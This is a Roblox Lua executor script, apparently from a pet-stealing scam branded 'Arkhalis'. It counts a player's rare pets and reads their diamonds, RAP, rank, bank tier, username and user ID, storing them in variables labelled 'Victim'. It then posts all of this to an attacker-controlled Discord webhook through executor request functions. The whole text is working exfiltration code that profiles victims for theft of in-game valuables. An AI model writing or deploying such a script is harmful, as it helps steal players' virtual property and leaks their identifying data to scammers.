
local Exclusive = 0

for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
    if v:IsA("TextButton") then
    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") then
                    Exclusive = Exclusive + 1
                end
            end
	end

local Event = 0

for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
    if v:IsA("TextButton") then
    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
                    Event = Event + 1
                end
            end
	end

_G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
_G.PlrUserVictim = game.Players.LocalPlayer.Name
_G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
_G.DisplayDiamond = game:GetService("Players").LocalPlayer.leaderstats.Diamonds.Value
_G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
_G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
local GemsFormated = (require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)( _G.DisplayDiamond ))
local RapFormated = (require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)( _G.DisplayRap ))
local webhookcolor = "13369599"

local function sendwebhook(msg)
local msg = {
	["avatar_url"] = "https://cdn.discordapp.com/attachments/1106232994441732117/1106233834850222231/33333.png",
	["content"]= "**Arkhalis Better**",
	["username"] = "Arkhalis",
	["embeds"]= {
	  {
		["title"]= "***:e_mail: Arkhalis Cheack:e_mail:***",
		["description"]= "**Pet Sending Ⓐⓡⓚⓗⓐⓛⓘⓢ**",
		["url"]= "https://discord.gg/arkhalis",
		["color"]= ""..webhookcolor.."",
		["thumbnail"] = {
        ["url"] = "https://cdn.discordapp.com/attachments/1077585452309155850/1106236489819496448/cat.png",
        ["height"] = 420,
        ["width"] = 420
        },
        ["fields"]= {
            {
              ["name"]= "**<:diamond:1112767847899340810>Diamonds<:diamond:1112767847899340810>**",
              ["value"]= "```"..GemsFormated.."```",
              ["inline"]= true
            },
            {
              ["name"]= "**<:Hugecat:1112766460830429255>Exclusive<:Hugecat:1112766460830429255>**",
              ["value"]= "```"..Exclusive.."```",
              ["inline"]= true
            },
            {
              ["name"]= "**<:event:1112767158049591307>Event<:event:1112767158049591307>**",
              ["value"]= "```"..Event.."```",
              ["inline"]= true
            }
          }
  }
  },
	["attachments"] = {}
  }
  local Webhook = _G.Webhook
  request = http_request or request or HttpPost or syn.request
  request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
  end
  sendwebhook(msg)
